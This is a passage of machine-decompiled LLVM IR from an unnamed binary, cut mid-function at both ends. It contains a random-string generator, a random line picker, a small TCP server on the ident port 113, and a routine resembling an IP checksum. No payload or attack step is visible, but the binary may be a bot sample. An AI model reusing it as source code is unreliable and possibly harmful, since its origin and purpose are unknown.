  %v0_10000548 = call i32 @function_10004928()
  %v3_10000558 = icmp eq i32 %v0_10000548, 0
  br i1 %v3_10000558, label %dec_label_pc_10000560, label %dec_label_pc_1000056c

dec_label_pc_10000560:                            ; preds = %dec_label_pc_10000548
  br label %dec_label_pc_1000064c

dec_label_pc_1000056c:                            ; preds = %dec_label_pc_10000548
  %v3_10000570 = load i32, i32* @global_var_10010468.13, align 4
  %v1_10000574 = add i32 %v3_10000570, 1
  store i32 %v1_10000574, i32* @global_var_10010468.13, align 4
  %v1_10000588 = mul i32 %v1_10000574, 4
  %v1_1000058c = add i32 %v1_10000588, 4
  store i32 268436888, i32* @lr, align 4
  %v1_10000594 = call i32 @function_10007cec(i32 %v1_1000058c)
  %v3_100005f02 = load i32, i32* @global_var_10010468.13, align 4
  %v3_100005fc4 = icmp eq i32 %v3_100005f02, 1
  br i1 %v3_100005fc4, label %dec_label_pc_10000604, label %dec_label_pc_100005ac

dec_label_pc_100005ac:                            ; preds = %dec_label_pc_1000056c, %dec_label_pc_100005ac
  %storemerge16 = phi i32 [ %v1_100005e4, %dec_label_pc_100005ac ], [ 0, %dec_label_pc_1000056c ]
  %v1_100005b0 = mul i32 %storemerge16, 4
  %v2_100005bc = add i32 %v1_100005b0, %v1_10000594
  %v3_100005d0 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_100005d4 = add i32 %v3_100005d0, %v1_100005b0
  %v1_100005d8 = inttoptr i32 %v2_100005d4 to i32*
  %v2_100005d8 = load i32, i32* %v1_100005d8, align 4
  %v2_100005dc = inttoptr i32 %v2_100005bc to i32*
  store i32 %v2_100005d8, i32* %v2_100005dc, align 4
  %v1_100005e4 = add i32 %storemerge16, 1
  %v3_100005f0 = load i32, i32* @global_var_10010468.13, align 4
  %v1_100005f4 = add i32 %v3_100005f0, -1
  %v3_100005fc = icmp ugt i32 %v1_100005f4, %v1_100005e4
  br i1 %v3_100005fc, label %dec_label_pc_100005ac, label %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge

dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge: ; preds = %dec_label_pc_100005ac
  br label %dec_label_pc_10000604

dec_label_pc_10000604:                            ; preds = %dec_label_pc_1000056c, %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge
  %v3_10000608 = phi i32 [ %v3_100005f0, %dec_label_pc_100005ec.dec_label_pc_10000604_crit_edge ], [ %v3_100005f02, %dec_label_pc_1000056c ]
  %v1_1000060c = mul i32 %v3_10000608, 4
  %v2_10000618 = add i32 %v1_10000594, -4
  %v1_1000061c = add i32 %v2_10000618, %v1_1000060c
  %v2_10000624 = inttoptr i32 %v1_1000061c to i32*
  store i32 %v0_10000548, i32* %v2_10000624, align 4
  %v3_1000062c = load i32, i32* @global_var_1001048c.14, align 4
  store i32 268437048, i32* @lr, align 4
  %v1_10000634 = call i32 @function_10007e44(i32 %v3_1000062c)
  store i32 %v1_10000594, i32* @global_var_1001048c.14, align 4
  br label %dec_label_pc_1000064c

dec_label_pc_1000064c:                            ; preds = %dec_label_pc_10000560, %dec_label_pc_1000051c, %dec_label_pc_10000604
  %stack_var_-20.0 = phi i32 [ 1, %dec_label_pc_1000051c ], [ 0, %dec_label_pc_10000560 ], [ %v0_10000548, %dec_label_pc_10000604 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %v1_100005e4, { 1, 0 }
  uselistorder i32 %v1_100005b0, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v3_100005f02, { 1, 0 }
  uselistorder i32 %v1_10000594, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000064c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000604, { 1, 0 }
  uselistorder label %dec_label_pc_100005ac, { 1, 0 }
}

define i32 @function_1000066c() local_unnamed_addr {
dec_label_pc_1000066c:
  %v3_10000684 = load i8*, i8** @global_var_10010460.15, align 4
  %v4_10000684 = ptrtoint i8* %v3_10000684 to i32
  %v3_10000688 = icmp eq i8* %v3_10000684, null
  br i1 %v3_10000688, label %dec_label_pc_10000690, label %dec_label_pc_100006a0

dec_label_pc_10000690:                            ; preds = %dec_label_pc_1000066c
  store i32 268437140, i32* @lr, align 4
  %v0_10000690 = call i32 @function_10008158()
  br label %dec_label_pc_10000704

dec_label_pc_100006a0:                            ; preds = %dec_label_pc_1000066c
  %v3_100006a4 = load i32, i32* @global_var_10010464.16, align 4
  %v3_100006a8 = icmp eq i32 %v3_100006a4, 1
  br i1 %v3_100006a8, label %dec_label_pc_100006b0, label %dec_label_pc_100006c8

dec_label_pc_100006b0:                            ; preds = %dec_label_pc_100006a0
  store i32 %v4_10000684, i32* @r3, align 4
  %v3_100006bc = call i32 @function_10007634(i32 %v4_10000684, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10000704

dec_label_pc_100006c8:                            ; preds = %dec_label_pc_100006a0
  store i32 268437196, i32* @lr, align 4
  %v0_100006c8 = call i32 @function_10008158()
  %v3_100006d8 = load i32, i32* @global_var_10010464.16, align 4
  %v2_100006dc = urem i32 %v0_100006c8, %v3_100006d8
  %v3_100006ec = load i8*, i8** @global_var_10010460.15, align 4
  %v4_100006ec = ptrtoint i8* %v3_100006ec to i32
  %v2_100006f0 = add i32 %v4_100006ec, %v2_100006dc
  %v1_100006f4 = add i32 %v2_100006f0, 1
  store i32 %v1_100006f4, i32* @r3, align 4
  %v2_100006fc = call i32 @function_10007634(i32 %v1_100006f4, i32 %v2_100006f0)
  br label %dec_label_pc_10000704

dec_label_pc_10000704:                            ; preds = %dec_label_pc_100006b0, %dec_label_pc_10000690, %dec_label_pc_100006c8
  %stack_var_-24.0 = phi i32 [ %v0_10000690, %dec_label_pc_10000690 ], [ %v3_100006bc, %dec_label_pc_100006b0 ], [ %v2_100006fc, %dec_label_pc_100006c8 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_10000684, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10007634, { 1, 0 }
  uselistorder label %dec_label_pc_10000704, { 2, 0, 1 }
}

define i32 @function_10000724(i32 %arg1) local_unnamed_addr {
dec_label_pc_10000724:
  %v2_10000778 = add i32 %arg1, -1
  br label %dec_label_pc_10000764

dec_label_pc_10000740:                            ; preds = %dec_label_pc_10000790, %dec_label_pc_10000764
  store i32 %arg1, i32* @r3, align 4
  %v0_10000744 = call i32 @function_10006ed4()
  %v1_10000758 = add i32 %v0_10000744, %v2_10000778
  %v3_10000760 = inttoptr i32 %v1_10000758 to i8*
  store i8 0, i8* %v3_10000760, align 1
  br label %dec_label_pc_10000764

dec_label_pc_10000764:                            ; preds = %dec_label_pc_10000724, %dec_label_pc_10000740
  store i32 %arg1, i32* @r3, align 4
  %v0_10000768 = call i32 @function_10006ed4()
  %v1_1000077c = add i32 %v0_10000768, %v2_10000778
  %v1_10000780 = inttoptr i32 %v1_1000077c to i8*
  %v2_10000780 = load i8, i8* %v1_10000780, align 1
  %v3_10000788 = icmp eq i8 %v2_10000780, 13
  br i1 %v3_10000788, label %dec_label_pc_10000740, label %dec_label_pc_10000790

dec_label_pc_10000790:                            ; preds = %dec_label_pc_10000764
  store i32 %arg1, i32* @r3, align 4
  %v0_10000794 = call i32 @function_10006ed4()
  %v1_100007a8 = add i32 %v0_10000794, %v2_10000778
  %v1_100007ac = inttoptr i32 %v1_100007a8 to i8*
  %v2_100007ac = load i8, i8* %v1_100007ac, align 1
  %v3_100007b4 = icmp eq i8 %v2_100007ac, 10
  br i1 %v3_100007b4, label %dec_label_pc_10000740, label %dec_label_pc_100007bc

dec_label_pc_100007bc:                            ; preds = %dec_label_pc_10000790
  ret i32 %v0_10000794

; uselistorder directives
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10000764, { 1, 0 }
}

define i32 @function_100007d4() local_unnamed_addr {
dec_label_pc_100007d4:
  %stack_var_-1076 = alloca i32, align 4
  store i32 268437488, i32* @lr, align 4
  %v0_100007ec = call i32 @function_10008158()
  %v2_10000808 = srem i32 %v0_100007ec, 5
  %v1_10000824 = add nsw i32 %v2_10000808, 4
  %v1_10000830 = add nsw i32 %v2_10000808, 5
  store i32 268437564, i32* @lr, align 4
  %v1_10000838 = call i32 @function_10007cec(i32 %v1_10000830)
  store i32 268437604, i32* @lr, align 4
  %v3_10000860 = call i32 @function_10006e24(i32 %v1_10000838, i32 0, i32 %v1_10000830)
  store i32 268437624, i32* @lr, align 4
  %v3_10000874 = call i32 @function_10004ca0(i32 ptrtoint ([16 x i8]* @global_var_1000ce98.17 to i32), i32 ptrtoint (i32* @global_var_1000cea8.18 to i32))
  %v3_10000884 = icmp eq i32 %v3_10000874, 0
  br i1 %v3_10000884, label %dec_label_pc_100008fc.preheader, label %dec_label_pc_10000910

dec_label_pc_100008fc.preheader:                  ; preds = %dec_label_pc_100007d4
  %v2_100009048 = icmp sgt i32 %v2_10000808, -4
  br i1 %v2_100009048, label %dec_label_pc_10000898, label %dec_label_pc_10000a00

dec_label_pc_10000898:                            ; preds = %dec_label_pc_100008fc.preheader, %dec_label_pc_10000898
  %storemerge711 = phi i32 [ %v1_100008f4, %dec_label_pc_10000898 ], [ 0, %dec_label_pc_100008fc.preheader ]
  store i32 268437676, i32* @lr, align 4
  %v0_100008a8 = call i32 @function_10008158()
  %v2_100008c4 = srem i32 %v0_100008a8, 26
  %fold = add nsw i32 %v2_100008c4, 65
  %v1_100008ec = trunc i32 %fold to i8
  %v2_100008ec = load i32, i32* @r29, align 4
  %v3_100008ec = inttoptr i32 %v2_100008ec to i8*
  store i8 %v1_100008ec, i8* %v3_100008ec, align 1
  %v1_100008f4 = add nuw nsw i32 %storemerge711, 1
  %v2_10000904 = icmp slt i32 %v1_100008f4, %v1_10000824
  br i1 %v2_10000904, label %dec_label_pc_10000898, label %dec_label_pc_10000a00

dec_label_pc_10000910:                            ; preds = %dec_label_pc_100007d4
  store i32 268437780, i32* @lr, align 4
  %v0_10000910 = call i32 @function_10008158()
  store i32 268437788, i32* @lr, align 4
  %v0_10000918 = call i32 @function_10008158()
  %v0_10000920 = load i32, i32* @r29, align 4
  %v2_10000920 = mul i32 %v0_10000920, %v0_10000918
  %v2_1000093c = srem i32 %v2_10000920, 45402
  %v2_1000099c12 = icmp sgt i32 %v2_1000093c, -1
  %v2_10000974 = ptrtoint i32* %stack_var_-1076 to i32
  br i1 %v2_1000099c12, label %dec_label_pc_10000974, label %dec_label_pc_100009a4

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000910, %dec_label_pc_10000974
  %storemerge615 = phi i32 [ %v1_1000098c, %dec_label_pc_10000974 ], [ 0, %dec_label_pc_10000910 ]
  store i32 268437896, i32* @lr, align 4
  %v3_10000984 = call i32 @function_1000665c(i32 %v2_10000974, i32 1024, i32 %v3_10000874)
  %v1_1000098c = add nuw nsw i32 %storemerge615, 1
  %v2_1000099c = icmp slt i32 %storemerge615, %v2_1000093c
  br i1 %v2_1000099c, label %dec_label_pc_10000974, label %dec_label_pc_100009a4

dec_label_pc_100009a4:                            ; preds = %dec_label_pc_10000974, %dec_label_pc_10000910
  store i32 268437948, i32* @lr, align 4
  %v3_100009b8 = call i32 @function_10006e24(i32 %v2_10000974, i32 0, i32 1024)
  store i32 268437968, i32* @lr, align 4
  %v3_100009cc = call i32 @function_1000665c(i32 %v2_10000974, i32 1024, i32 %v3_10000874)
  store i32 268437980, i32* @lr, align 4
  %v1_100009d8 = call i32 @function_10000724(i32 %v2_10000974)
  store i32 %v1_10000838, i32* @r3, align 4
  store i32 %v2_10000974, i32* @r4, align 4
  store i32 %v1_10000824, i32* @r5, align 4
  store i32 268438008, i32* @lr, align 4
  %v0_100009f4 = call i32 @function_10006d88()
  store i32 268438016, i32* @lr, align 4
  %v1_100009fc = inttoptr i32 %v3_10000874 to i16*
  %v2_100009fc = call i32 @function_10004b54(i16* %v1_100009fc)
  br label %dec_label_pc_10000a00

dec_label_pc_10000a00:                            ; preds = %dec_label_pc_10000898, %dec_label_pc_100008fc.preheader, %dec_label_pc_100009a4
  ret i32 %v1_10000838

; uselistorder directives
  uselistorder i32 %v1_100008f4, { 1, 0 }
  uselistorder i32 %v1_10000838, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000a00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000974, { 1, 0 }
  uselistorder label %dec_label_pc_10000898, { 1, 0 }
}

define i32 @function_10000a24() local_unnamed_addr {
dec_label_pc_10000a24:
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-1240 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-1216 = alloca i32, align 4
  %stack_var_-1196 = alloca i32, align 4
  %stack_var_-1204 = alloca i32, align 4
  %stack_var_-1212 = alloca i32, align 4
  store i32 268438088, i32* @lr, align 4
  %v3_10000a44 = call i32 @function_10007cb8(i32 2, i32 1, i32 0)
  %v4_10000a58 = icmp eq i32 %v3_10000a44, -1
  br i1 %v4_10000a58, label %dec_label_pc_10000d80, label %dec_label_pc_10000a60

dec_label_pc_10000a60:                            ; preds = %dec_label_pc_10000a24
  store i32 2, i32* %stack_var_-1212, align 4
  store i32 113, i32* @r3, align 4
  %v1_10000a6c = call i32 @function_10007640(i32 113)
  %v2_10000a80 = ptrtoint i32* %stack_var_-1212 to i32
  %v2_10000a84 = ptrtoint i32* %stack_var_-1204 to i32
  store i32 0, i32* %stack_var_-1204, align 4
  store i32 268438188, i32* @lr, align 4
  %v4_10000aa8 = call i32 @function_10007b6c(i32 %v3_10000a44, i32 %v2_10000a80, i32 16, i32 %v2_10000a84)
  %v4_10000ab4 = icmp eq i32 %v4_10000aa8, -1
  br i1 %v4_10000ab4, label %dec_label_pc_10000d80, label %dec_label_pc_10000abc

dec_label_pc_10000abc:                            ; preds = %dec_label_pc_10000a60
  store i32 268438216, i32* @lr, align 4
  %v3_10000ac4 = call i32 @function_10007bd4(i32 %v3_10000a44, i32 1, i32 %v4_10000aa8)
  %v4_10000ad0 = icmp eq i32 %v3_10000ac4, -1
  br i1 %v4_10000ad0, label %dec_label_pc_10000d80, label %dec_label_pc_10000ad8

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000abc
  store i32 268438236, i32* @lr, align 4
  %v0_10000ad8 = call i32 @function_10004928()
  %v3_10000ae0 = icmp eq i32 %v0_10000ad8, 0
  br i1 %v3_10000ae0, label %dec_label_pc_10000d80, label %dec_label_pc_10000ae8

dec_label_pc_10000ae8:                            ; preds = %dec_label_pc_10000ad8
  store i32 16, i32* %stack_var_-1216, align 4
  %v2_10000af0 = ptrtoint i32* %stack_var_-1196 to i32
  %v2_10000af4 = ptrtoint i32* %stack_var_-1216 to i32
  store i32 268438280, i32* @lr, align 4
  %v4_10000b04 = call i32 @function_10007b38(i32 %v3_10000a44, i32 %v2_10000af0, i32 %v2_10000af4, i32 %v2_10000af4)
  %v4_10000b18 = icmp eq i32 %v4_10000b04, -1
  br i1 %v4_10000b18, label %dec_label_pc_10000b20, label %dec_label_pc_10000b28.preheader

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000ae8
  %v0_10000b24 = call i32 @function_10008858()
  br label %dec_label_pc_10000b28.preheader

dec_label_pc_10000b28.preheader:                  ; preds = %dec_label_pc_10000b20, %dec_label_pc_10000ae8
  %v2_10000b28 = ptrtoint i32* %stack_var_-148 to i32
  %v1_10000b70 = udiv i32 %v4_10000b04, 32
  %v1_10000b78 = mul nuw nsw i32 %v1_10000b70, 4
  %v2_10000b7c = ptrtoint i32* %stack_var_-1240 to i32
  %v2_10000b80 = add i32 %v2_10000b7c, 1092
  %v1_10000b84 = add i32 %v2_10000b80, %v1_10000b78
  %v1_10000b88 = inttoptr i32 %v1_10000b84 to i32*
  %v1_10000b90 = urem i32 %v4_10000b04, 32
  %v3_10000b98 = shl i32 1, %v1_10000b90
  %v1_10000bc8 = add i32 %v4_10000b04, 1
  %v2_10000bd0 = ptrtoint i32* %stack_var_-156 to i32
  %v3_10000c24 = sub i32 0, %v4_10000b04
  %v4_10000c24 = urem i32 %v3_10000c24, 32
  %v6_10000c24 = xor i32 %v4_10000c24, 31
  %v12_10000c24 = lshr i32 -1, %v1_10000b90
  %v16_10000c24 = xor i32 %v12_10000c24, 1
  %v14_10000c24 = urem i32 %v12_10000c24, 2
  br label %dec_label_pc_10000b28

dec_label_pc_10000b28:                            ; preds = %dec_label_pc_10000b28.preheader, %dec_label_pc_10000c00
  store i32 %v2_10000b28, i32* %stack_var_-1240, align 4
  store i32 0, i32* %stack_var_-148, align 4
  br label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge

dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge: ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge, %dec_label_pc_10000b28
  %v3_10000b40.pre = phi i32 [ %v2_10000b28, %dec_label_pc_10000b28 ], [ %v3_10000b40.pre.pre, %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge ]
  %v1_10000b5830 = phi i32 [ 1, %dec_label_pc_10000b28 ], [ %v1_10000b58, %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge ]
  %v1_10000b44 = mul nuw nsw i32 %v1_10000b5830, 4
  %v2_10000b48 = add i32 %v1_10000b44, %v3_10000b40.pre
  %v2_10000b50 = inttoptr i32 %v2_10000b48 to i32*
  store i32 0, i32* %v2_10000b50, align 4
  %v1_10000b58 = add nuw nsw i32 %v1_10000b5830, 1
  %tmp25 = icmp ult i32 %v1_10000b58, 32
  br i1 %tmp25, label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge, label %dec_label_pc_10000b6c

dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge.dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge_crit_edge: ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge
  %v3_10000b40.pre.pre = load i32, i32* %stack_var_-1240, align 4
  br label %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge

dec_label_pc_10000b6c:                            ; preds = %dec_label_pc_10000b3c.dec_label_pc_10000b3c_crit_edge
  %v2_10000b88 = load i32, i32* %v1_10000b88, align 4
  %v2_10000b9c = or i32 %v2_10000b88, %v3_10000b98
  store i32 %v2_10000b9c, i32* %v1_10000b88, align 4
  store i32 60, i32* %stack_var_-156, align 4
  store i32 268438508, i32* @lr, align 4
  %v6_10000be8 = call i32 @function_10004a48(i32 %v1_10000bc8, i32 %v2_10000b28, i32 0, i32 0, i32 %v2_10000bd0, i32 %v2_10000b28)
  %tmp26 = icmp sgt i32 %v6_10000be8, -1
  br i1 %tmp26, label %dec_label_pc_10000c00, label %dec_label_pc_10000bf8

dec_label_pc_10000bf8:                            ; preds = %dec_label_pc_10000b6c
  %v0_10000bfc = call i32 @function_10008858()
  br label %dec_label_pc_10000c00

dec_label_pc_10000c00:                            ; preds = %dec_label_pc_10000b6c, %dec_label_pc_10000bf8
  %v2_10000c18 = load i32, i32* %v1_10000b88, align 4
  %v5_10000c24 = shl i32 %v2_10000c18, %v4_10000c24
  %v7_10000c24 = lshr i32 %v2_10000c18, %v6_10000c24
  %v8_10000c24 = udiv i32 %v7_10000c24, 2
  %v9_10000c24 = or i32 %v8_10000c24, %v5_10000c24
  %tmp = icmp slt i32 %v2_10000c18, 0
  %v15_10000c242 = zext i1 %tmp to i32
  %v17_10000c24 = and i32 %v15_10000c242, %v16_10000c24
  %v14_10000c24.masked = and i32 %v14_10000c24, %v9_10000c24
  %v1_10000c2c = or i32 %v14_10000c24.masked, %v17_10000c24
  %v3_10000c30 = icmp eq i32 %v1_10000c2c, 0
  br i1 %v3_10000c30, label %dec_label_pc_10000b28, label %dec_label_pc_10000c3c

dec_label_pc_10000c3c:                            ; preds = %dec_label_pc_10000c00
  %v2_10000c3c = ptrtoint i32* %stack_var_-1180 to i32
  store i32 268438612, i32* @lr, align 4
  %v4_10000c50 = call i32 @function_10007c04(i32 %v4_10000b04, i32 %v2_10000c3c, i32 1024, i32 0)
  %tmp27 = icmp slt i32 %v4_10000c50, 1
  br i1 %tmp27, label %dec_label_pc_10000c74, label %dec_label_pc_10000c68

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c3c
  %tmp28 = icmp slt i32 %v4_10000c50, 20
  br i1 %tmp28, label %dec_label_pc_10000c7c, label %dec_label_pc_10000c74

dec_label_pc_10000c74:                            ; preds = %dec_label_pc_10000c68, %dec_label_pc_10000c3c
  %v0_10000c78 = call i32 @function_10008858()
  br label %dec_label_pc_10000c7c

dec_label_pc_10000c7c:                            ; preds = %dec_label_pc_10000c68, %dec_label_pc_10000c74
  %v2_10000c84 = add i32 %v2_10000b7c, 60
  %v3_10000c8c = add i32 %v2_10000c84, %v4_10000c50
  %v4_10000c8c = inttoptr i32 %v3_10000c8c to i8*
  store i8 0, i8* %v4_10000c8c, align 1
  %v1_10000c94 = add i32 %v2_10000b7c, -1
  %v2_10000c9c = add i32 %v1_10000c94, %v4_10000c50
  %v1_10000ca0 = add i32 %v2_10000c9c, 60
  %v2_10000ca0 = inttoptr i32 %v1_10000ca0 to i8*
  %v3_10000ca0 = load i8, i8* %v2_10000ca0, align 1
  %v3_10000ca8 = icmp eq i8 %v3_10000ca0, 10
  br i1 %v3_10000ca8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000cb0

dec_label_pc_10000cb0:                            ; preds = %dec_label_pc_10000c7c
  %v3_10000cc0 = load i8, i8* %v2_10000ca0, align 1
  %v3_10000cc8 = icmp eq i8 %v3_10000cc0, 13
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000ce8

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cb0, %dec_label_pc_10000c7c
  store i8 0, i8* %v2_10000ca0, align 1
  br label %dec_label_pc_10000ce8

dec_label_pc_10000ce8:                            ; preds = %dec_label_pc_10000cb0, %dec_label_pc_10000cd0
  %v1_10000cec = add i32 %v2_10000b7c, -2
  %v2_10000cf4 = add i32 %v1_10000cec, %v4_10000c50
  %v1_10000cf8 = add i32 %v2_10000cf4, 60
  %v2_10000cf8 = inttoptr i32 %v1_10000cf8 to i8*
  %v3_10000cf8 = load i8, i8* %v2_10000cf8, align 1
  %v3_10000d00 = icmp eq i8 %v3_10000cf8, 10
  br i1 %v3_10000d00, label %dec_label_pc_10000d28, label %dec_label_pc_10000d08

dec_label_pc_10000d08:                            ; preds = %dec_label_pc_10000ce8
  %v3_10000d18 = load i8, i8* %v2_10000cf8, align 1
  %v3_10000d20 = icmp eq i8 %v3_10000d18, 13
  br i1 %v3_10000d20, label %dec_label_pc_10000d28, label %dec_label_pc_10000d40

dec_label_pc_10000d28:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000ce8
  store i8 0, i8* %v2_10000cf8, align 1
  br label %dec_label_pc_10000d40

dec_label_pc_10000d40:                            ; preds = %dec_label_pc_10000d08, %dec_label_pc_10000d28
  %v3_10000d44 = load i32, i32* @global_var_10010470.19, align 4
  %v6_10000d64 = call i32 @function_1000041c(i32 %v4_10000b04, i32 ptrtoint ([25 x i8]* @global_var_1000ceac.20 to i32), i32 %v2_10000c3c, i32 %v3_10000d44)
  store i32 268438896, i32* @lr, align 4
  %v1_10000d6c = call i32 @function_100048e0(i32 %v4_10000b04)
  store i32 ptrtoint ([3 x i8]* @global_var_10000d78.21 to i32), i32* @lr, align 4
  %v1_10000d74 = call i32 @function_100048e0(i32 %v3_10000a44)
  %v0_10000d7c = call i32 @function_10008858()
  br label %dec_label_pc_10000d80

dec_label_pc_10000d80:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000abc, %dec_label_pc_10000a60, %dec_label_pc_10000a24, %dec_label_pc_10000d40
  %v0_10000d94 = phi i32 [ 0, %dec_label_pc_10000ad8 ], [ -1, %dec_label_pc_10000abc ], [ -1, %dec_label_pc_10000a60 ], [ -1, %dec_label_pc_10000a24 ], [ %v0_10000d7c, %dec_label_pc_10000d40 ]
  ret i32 %v0_10000d94

; uselistorder directives
  uselistorder i8* %v2_10000cf8, { 1, 0, 2 }
  uselistorder i8* %v2_10000ca0, { 1, 0, 2 }
  uselistorder i32 %v4_10000c50, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_10000c18, { 0, 2, 1 }
  uselistorder i32 %v1_10000b58, { 1, 0 }
  uselistorder i32 %v1_10000b90, { 1, 0 }
  uselistorder i32* %v1_10000b88, { 1, 0, 2 }
  uselistorder i32 %v2_10000b28, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10000b04, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32* %stack_var_-1212, { 1, 0 }
  uselistorder i32* %stack_var_-1216, { 1, 0 }
  uselistorder label %dec_label_pc_10000d80, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10000d40, { 1, 0 }
  uselistorder label %dec_label_pc_10000ce8, { 1, 0 }
  uselistorder label %dec_label_pc_10000c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10000c00, { 1, 0 }
  uselistorder label %dec_label_pc_10000b28, { 1, 0 }
}

define i32 @function_10000d98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10000d98:
  %v3_10000db8 = icmp eq i32 %arg2, 0
  br i1 %v3_10000db8, label %dec_label_pc_10000dc0, label %dec_label_pc_10000dcc

dec_label_pc_10000dc0:                            ; preds = %dec_label_pc_10000d98
  br label %dec_label_pc_10000e08

dec_label_pc_10000dcc:                            ; preds = %dec_label_pc_10000d98
  %v3_10000dd0 = icmp eq i32 %arg2, 1
  br i1 %v3_10000dd0, label %dec_label_pc_10000dd8, label %dec_label_pc_10000de4

dec_label_pc_10000dd8:                            ; preds = %dec_label_pc_10000dcc
  br label %dec_label_pc_10000e08

dec_label_pc_10000de4:                            ; preds = %dec_label_pc_10000dcc
  %v1_10000de8 = add i32 %arg2, -1
  %v2_10000df4 = call i32 @function_10000d98(i32 %arg1, i32 %v1_10000de8)
  %v2_10000e00 = mul i32 %v2_10000df4, %arg1
  br label %dec_label_pc_10000e08

dec_label_pc_10000e08:                            ; preds = %dec_label_pc_10000dd8, %dec_label_pc_10000dc0, %dec_label_pc_10000de4
  %stack_var_-16.0 = phi i32 [ 1, %dec_label_pc_10000dc0 ], [ %arg1, %dec_label_pc_10000dd8 ], [ %v2_10000e00, %dec_label_pc_10000de4 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000e08, { 2, 0, 1 }
}

define i32 @function_10000e28(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10000e28:
  %v2_10000e946 = icmp sgt i32 %arg2, 1
  br i1 %v2_10000e946, label %dec_label_pc_10000e60, label %dec_label_pc_10000e9c

dec_label_pc_10000e60:                            ; preds = %dec_label_pc_10000e28, %dec_label_pc_10000e60
  %stack_var_-24.010 = phi i32 [ %v1_10000e88, %dec_label_pc_10000e60 ], [ %arg2, %dec_label_pc_10000e28 ]
  %stack_var_-28.09 = phi i16* [ %v5_10000e80, %dec_label_pc_10000e60 ], [ %arg1, %dec_label_pc_10000e28 ]
  %stack_var_-32.08 = phi i32 [ %v2_10000e70, %dec_label_pc_10000e60 ], [ 0, %dec_label_pc_10000e28 ]
  %v4_10000e60 = ptrtoint i16* %stack_var_-28.09 to i32
  %v2_10000e64 = load i16, i16* %stack_var_-28.09, align 2
  %v3_10000e64 = zext i16 %v2_10000e64 to i32
  %v2_10000e70 = add i32 %v3_10000e64, %stack_var_-32.08
  %v1_10000e7c = add i32 %v4_10000e60, 2
  %v5_10000e80 = inttoptr i32 %v1_10000e7c to i16*
  %v1_10000e88 = add nsw i32 %stack_var_-24.010, -2
  %v2_10000e94 = icmp sgt i32 %v1_10000e88, 1
  br i1 %v2_10000e94, label %dec_label_pc_10000e60, label %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge

dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge: ; preds = %dec_label_pc_10000e60
  %v3_10000e94.le = icmp eq i32 %v1_10000e88, 1
  br i1 %v3_10000e94.le, label %dec_label_pc_10000ea8, label %dec_label_pc_10000ed0

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e28
  %v3_10000e947 = icmp eq i32 %arg2, 1
  br i1 %v3_10000e947, label %dec_label_pc_10000ea8, label %dec_label_pc_10000ed0

dec_label_pc_10000ea8:                            ; preds = %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge, %dec_label_pc_10000e9c
  %stack_var_-28.0.lcssa18 = phi i16* [ %v5_10000e80, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ], [ %arg1, %dec_label_pc_10000e9c ]
  %stack_var_-32.0.lcssa17 = phi i32 [ %v2_10000e70, %dec_label_pc_10000e90.dec_label_pc_10000e9c_crit_edge ], [ 0, %dec_label_pc_10000e9c ]
  %v1_10000eb0 = bitcast i16* %stack_var_-28.0.lcssa18 to i8*
  %v2_10000eb0 = load i8, i8* %v1_10000eb0, align 1
  %v3_10000eb0 = zext i8 %v2_10000eb0 to i32
  %v2_10000ec8 = add i32 %v3_10000eb0, %stack_var_-32.0.lcssa17
  br label %dec_label_pc_10000ed0

